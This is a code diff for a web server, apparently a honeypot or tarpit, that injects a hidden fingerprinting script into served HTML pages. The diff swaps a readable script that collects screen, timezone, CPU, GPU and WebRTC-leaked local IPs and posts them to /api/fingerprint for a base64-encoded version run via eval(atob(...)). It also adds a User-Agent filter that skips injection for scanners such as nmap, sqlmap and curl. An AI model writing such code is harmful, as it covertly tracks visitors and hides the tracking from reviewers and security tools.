@@ -572,76 +572,29 @@ function streamInfiniteGitRefs(socket) {
 }
 
 // ─── 9. JS Browser Fingerprint & WebRTC Leak Script ──────────────────────────
-const JS_FINGERPRINT_SCRIPT = `
-<script>
-(function() {
-    try {
-        const payload = {
-            screen: \`\${window.screen.width}x\${window.screen.height}\`,
-            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-            cores: navigator.hardwareConcurrency || 'unknown',
-            gpu: 'unknown',
-            local_ips: []
-        };
+const OBFUSCATED_FINGERPRINT_PAYLOAD = "IWZ1bmN0aW9uKCl7dHJ5e3ZhciBwPXtzOndpbmRvdy5zY3JlZW4ud2lkdGgrIngiK3dpbmRvdy5zY3JlZW4uaGVpZ2h0LHQ6SW50bC5EYXRlVGltZUZvcm1hdCgpLnJlc29sdmVkT3B0aW9ucygpLnRpbWVab25lLGM6bmF2aWdhdG9yLmhhcmR3YXJlQ29uY3VycmVuY3l8fCJ1bmtub3duIixnOiJ1bmtub3duIixsOltdfTt0cnl7dmFyIGM9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiY2FudmFzIiksZ2w9Yy5nZXRDb250ZXh0KCJ3ZWJnbCIpfHxjLmdldENvbnRleHQoImV4cGVyaW1lbnRhbC13ZWJnbCIpO2lmKGdsKXt2YXIgZD1nbC5nZXRFeHRlbnNpb24oIldFQkdMX2RlYnVnX3JlbmRlcmVyX2luZm8iKTtkJiYocC5nPWdsLmdldFBhcmFtZXRlcihkLlVOTUFTS0VEX1JFTkRFUkVSX0lEX1NHSVgpKX19Y2F0Y2goZSl7fXRyeXt2YXIgcj13aW5kb3cuUlRDUGVlckNvbm5lY3Rpb258fHdpbmRvdy5tb3pSVENQZWVyQ29ubmVjdGlvbnx8d2luZG93LndlYmtpdFJUQ1BlZXJDb25uZWN0aW9uO2lmKHIpe3ZhciBwYz1uZXcgcih7aWNlU2VydmVyczpbXX0pO3BjLmNyZWF0ZURhdGFDaGFubmVsKCIiKSxwYy5jcmVhdGVPZmZlcigpLnRoZW4oZnVuY3Rpb24oZSl7cGMuc2V0TG9jYWxEZXNjcmlwdGlvbihlKX0pLHBjLm9uaWNlY2FuZGlkYXRlPWZ1bmN0aW9uKGUpe2lmKGUmJmUuY2FuZGlkYXRlJiZlLmNhbmRpZGF0ZS5jYW5kaWRhdGUpe3ZhciB0PWUuY2FuZGlkYXRlLmNhbmRpZGF0ZS5tYXRjaCgvKFswLTldezEsM31cLlswLTldezEsM31cLlswLTldezEsM31cLlswLTldezEsM30pLyk7dCYmdFsxXSYmLTE9PT1wLmwuaW5kZXhPZih0WzFdKSYmKHAubC5wdXNoKHRbMV0pLHMoKSl9fX19Y2F0Y2goZSl7fWZ1bmN0aW9uIHMoKXtmZXRjaCgiL2FwaS9maW5nZXJwcmludCIse21ldGhvZDoiUE9TVCIsaGVhZGVyczp7IkNvbnRlbnQtVHlwZSI6ImFwcGxpY2F0aW9uL2pzb24ifSxib2R5OkpTT04uc3RyaW5naWZ5KHtzY3JlZW46cC5zLHRpbWV6b25lOnAudCxjb3JlczpwLmMsZ3B1OnAuZyxsb2NhbF9pcHM6cC5sfSl9KS5jYXRjaChmdW5jdGlvbigpe30pfXNldFRpbWVvdXQocywxZTMpfWNhdGNoKGUpe319KCk7";
 
-        // Canvas fingerprinting (GPU signature hash)
-        try {
-            const canvas = document.createElement('canvas');
-            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-            if (gl) {
-                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-                if (debugInfo) {
-                    payload.gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_ID_SGIX);
-                }
-            }
-        } catch (_) {}
-
-        // WebRTC Local IP Leak
-        try {
-            const myPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
-            if (myPeerConnection) {
-                const pc = new myPeerConnection({ iceServers: [] });
-                pc.createDataChannel('');
-                pc.createOffer().then(offer => pc.setLocalDescription(offer));
-                pc.onicecandidate = function(ice) {
-                    if (ice && ice.candidate && ice.candidate.candidate) {
-                        const candidate = ice.candidate.candidate;
-                        const match = candidate.match(/([0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3})/);
-                        if (match && match[1]) {
-                            const ip = match[1];
-                            if (!payload.local_ips.includes(ip)) {
-                                payload.local_ips.push(ip);
-                                sendPayload();
-                            }
-                        }
-                    }
-                };
-            }
-        } catch (_) {}
-
-        function sendPayload() {
-            fetch('/api/fingerprint', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(payload)
-            }).catch(() => {});
-        }
-
-        // Send baseline payload immediately
-        setTimeout(sendPayload, 1000);
-    } catch (_) {}
-})();
-</script>
-`;
+const JS_FINGERPRINT_SCRIPT = `<script>eval(atob("${OBFUSCATED_FINGERPRINT_PAYLOAD}"))</script>`;
 
 /**
  * Injects the hidden fingerprint script before the closing body tag.
+ * Only injects if the User-Agent resembles a standard browser and is not a bot.
  *
  * @param {string} html
+ * @param {string} ua
  * @returns {string}
  */
-function injectFingerprint(html) {
+function injectFingerprint(html, ua = '') {
     if (!html) return html;
+
+    if (ua) {
+        const isBot = /curl|wget|python|nikto|nmap|sqlmap|scan|crawler|bot|spider|headless/i.test(ua);
+        const isBrowser = /mozilla|chrome|safari|firefox|edge|opera/i.test(ua) && !isBot;
+        if (!isBrowser) {
+            return html;
+        }
+    }
+
     if (html.includes('</body>')) {
         return html.replace('</body>', JS_FINGERPRINT_SCRIPT + '</body>');
     }
